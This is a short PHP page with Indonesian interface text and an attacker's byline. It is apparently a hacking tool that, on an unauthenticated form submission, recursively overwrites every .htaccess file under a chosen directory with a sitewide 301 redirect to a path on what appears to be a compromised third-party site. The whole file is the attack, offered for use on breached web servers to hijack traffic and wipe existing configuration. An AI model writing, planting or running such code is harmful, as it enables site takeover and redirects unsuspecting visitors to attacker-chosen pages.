<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update .htaccess</title>
</head>
<body>
    <?php
    function replaceHtaccess($dir) {
        $files = scandir($dir);
        
        foreach ($files as $file) {
            if ($file == '.' || $file == '..') continue;

            $path = $dir . '/' . $file;

            if (is_dir($path)) {
                replaceHtaccess($path);
            } elseif ($file == '.htaccess') {
                $newContents = "Redirect 301 / https://wimberleylibrary.org/dup-installer/karo-pride/";
                file_put_contents($path, $newContents);
                echo "File .htaccess di $dir berhasil diperbarui.<br>";
            }
        }
    }

    $cwd = getcwd();

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $directory = $_POST["directory"];

        replaceHtaccess($directory);
    }
    ?>
    <h2>Masukkan direktori tempat file .htaccess berada:</h2>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
        <label for="directory">Direktori:</label>
        <input type="text" id="directory" name="directory" value="<?php echo $cwd; ?>" required>
        <button type="submit">Perbarui .htaccess di semua subdirektori</button>
    </form>
    <h1>DIBUAT OLEH Matigan / 3N</h1>
</body>
</html>
